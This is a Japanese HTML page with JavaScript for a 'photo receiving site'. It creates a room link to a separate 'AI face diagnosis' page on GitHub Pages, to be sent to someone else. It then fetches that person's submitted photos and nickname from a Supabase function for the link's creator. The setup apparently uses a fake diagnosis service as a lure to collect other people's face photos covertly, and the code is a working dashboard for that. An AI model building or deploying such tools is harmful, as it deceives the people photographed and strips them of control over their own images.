```html
<!DOCTYPE html>
<html lang="ja">
<head>

<meta charset="UTF-8">

<meta
  name="viewport"
  content="width=device-width, initial-scale=1.0"
>

<title>📷 写真受信</title>

<style>

* {
  box-sizing: border-box;
}

body {

  margin: 0;

  padding: 20px;

  font-family:
    sans-serif;

  background:
    linear-gradient(
      135deg,
      #111827,
      #312e81,
      #581c87
    );

  min-height: 100vh;

  color: #222;

}

.container {

  max-width: 600px;

  margin: auto;

  background: white;

  padding: 25px;

  border-radius: 24px;

  box-shadow:
    0 10px 40px
    rgba(0,0,0,0.35);

}

h1 {

  text-align: center;

  margin-top: 0;

}

button {

  width: 100%;

  padding: 15px;

  margin-top: 12px;

  border: none;

  border-radius: 12px;

  background: #111827;

  color: white;

  font-size: 16px;

}

button:disabled {

  background: #999;

}

.linkBox {

  margin-top: 20px;

  padding: 15px;

  background: #f3f4f6;

  border-radius: 15px;

  word-break: break-all;

}

.roomBox {

  margin-top: 15px;

  padding: 12px;

  background: #faf5ff;

  border-radius: 12px;

  font-size: 14px;

}

.message {

  margin-top: 20px;

  text-align: center;

  color: #555;

}

.photoList {

  margin-top: 20px;

}

.photoItem {

  margin-top: 20px;

  padding: 15px;

  background: #f5f5f7;

  border-radius: 18px;

}

.photoItem img {

  display: block;

  width: 100%;

  margin-top: 12px;

  border-radius: 14px;

}

.nickname {

  margin-top: 8px;

  font-size: 18px;

  font-weight: bold;

  color: #4f46e5;

}

.time {

  margin-top: 5px;

  font-size: 12px;

  color: #777;

}

.hidden {

  display: none;

}

</style>

</head>


<body>

<div class="container">

<h1>
📷 写真受信サイト
</h1>


<p>
リンクを作成して、相手から写真を受け取ります。
</p>


<button
  id="createButton"
>
🔗 リンクを作成
</button>


<div
  id="linkArea"
  class="hidden"
>

<div class="linkBox">

<strong>
相手に送るリンク
</strong>

<p
  id="linkText"
></p>

</div>


<button
  id="copyButton"
>
📋 リンクをコピー
</button>


<button
  id="openButton"
>
🌐 診断サイトを開く
</button>


</div>


<div
  id="roomBox"
  class="roomBox hidden"
>

ルームID：

<strong
  id="roomText"
></strong>

</div>


<button
  id="refreshButton"
>
🔄 写真を確認
</button>


<div
  id="message"
  class="message"
>
まだ写真は確認していません。
</div>


<div
  id="photoArea"
  class="photoList"
></div>


</div>


<script>

const FUNCTION_URL =
  "https://crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/photo-receiver";


const AI_SITE =
  "https://gaffney16445.github.io/ai-face-diagnosis/";


const createButton =
  document.getElementById(
    "createButton"
  );


const copyButton =
  document.getElementById(
    "copyButton"
  );


const openButton =
  document.getElementById(
    "openButton"
  );


const refreshButton =
  document.getElementById(
    "refreshButton"
  );


const linkArea =
  document.getElementById(
    "linkArea"
  );


const roomBox =
  document.getElementById(
    "roomBox"
  );


const linkText =
  document.getElementById(
    "linkText"
  );


const roomText =
  document.getElementById(
    "roomText"
  );


const message =
  document.getElementById(
    "message"
  );


const photoArea =
  document.getElementById(
    "photoArea"
  );


let room = "";

let currentLink = "";


/*
ルームID作成
*/

function makeRoomId() {

  const chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  let result = "";


  for (
    let i = 0;
    i < 12;
    i++
  ) {

    result +=
      chars.charAt(
        Math.floor(
          Math.random() *
          chars.length
        )
      );

  }


  return result;

}


/*
表示
*/

function showRoom() {

  if (!room) {

    linkArea.classList.add(
      "hidden"
    );

    roomBox.classList.add(
      "hidden"
    );

    return;

  }


  currentLink =
    AI_SITE +
    "?room=" +
    encodeURIComponent(
      room
    );


  linkText.textContent =
    currentLink;


  roomText.textContent =
    room;


  linkArea.classList.remove(
    "hidden"
  );


  roomBox.classList.remove(
    "hidden"
  );

}


/*
リンク作成
*/

createButton.onclick =
  function () {

    room =
      makeRoomId();


    try {

      localStorage.setItem(
        "receiverRoom",
        room
      );

    } catch (error) {

      console.error(
        "保存エラー:",
        error
      );

    }


    photoArea.innerHTML =
      "";

    message.textContent =
      "リンクを作成しました。";


    showRoom();

  };


/*
コピー
*/

copyButton.onclick =
  async function () {

    if (!currentLink) {

      return;

    }


    try {

      await navigator.clipboard.writeText(
        currentLink
      );

      message.textContent =
        "リンクをコピーしました！";

    } catch (error) {

      message.textContent =
        "コピーできませんでした。リンクを長押ししてコピーしてください。";

    }

  };


/*
診断サイトを開く
*/

openButton.onclick =
  function () {

    if (!currentLink) {

      return;

    }


    window.location.href =
      currentLink;

  };


/*
写真確認
*/

refreshButton.onclick =
  async function () {

    if (!room) {

      message.textContent =
        "先に「リンクを作成」を押してください。";

      return;

    }


    refreshButton.disabled =
      true;

    refreshButton.textContent =
      "読み込み中...";


    message.textContent =
      "写真を確認しています...";


    photoArea.innerHTML =
      "";


    try {

      const url =
        FUNCTION_URL +
        "?room=" +
        encodeURIComponent(
          room
        );


      const response =
        await fetch(
          url
        );


      const text =
        await response.text();


      if (!response.ok) {

        throw new Error(
          "HTTP " +
          response.status
        );

      }


      const data =
        JSON.parse(
          text
        );


      if (!data.success) {

        throw new Error(
          data.error ||
          "写真取得エラー"
        );

      }


      if (
        !data.photos ||
        data.photos.length === 0
      ) {

        message.textContent =
          "まだ写真は届いていません。";

        return;

      }


      message.textContent =
        data.photos.length +
        "枚の写真が届いています。";


      data.photos.forEach(
        function (
          photo,
          index
        ) {


          const item =
            document.createElement(
              "div"
            );


          item.className =
            "photoItem";


          const title =
            document.createElement(
              "strong"
            );


          title.textContent =
            "📷 写真 " +
            (
              index + 1
            );


          const nickname =
            document.createElement(
              "div"
            );


          nickname.className =
            "nickname";


          nickname.textContent =
            "👤 " +
            (
              photo.nickname ||
              "名前なし"
            ) +
            " さん";


          const image =
            document.createElement(
              "img"
            );


          image.src =
            photo.url;


          image.alt =
            "受信した写真";


          item.appendChild(
            title
          );


          item.appendChild(
            nickname
          );


          item.appendChild(
            image
          );


          photoArea.appendChild(
            item
          );

        }
      );


    } catch (error) {

      console.error(
        "写真取得エラー:",
        error
      );


      message.textContent =
        "写真を取得できませんでした。";

    } finally {

      refreshButton.disabled =
        false;

      refreshButton.textContent =
        "🔄 写真を確認";

    }

  };


/*
前回のルームを復元
*/

try {

  const savedRoom =
    localStorage.getItem(
      "receiverRoom"
    );


  if (savedRoom) {

    room =
      savedRoom;

    showRoom();

  }

} catch (error) {

  console.error(
    "復元エラー:",
    error
  );

}

</script>

</body>
</html>
```
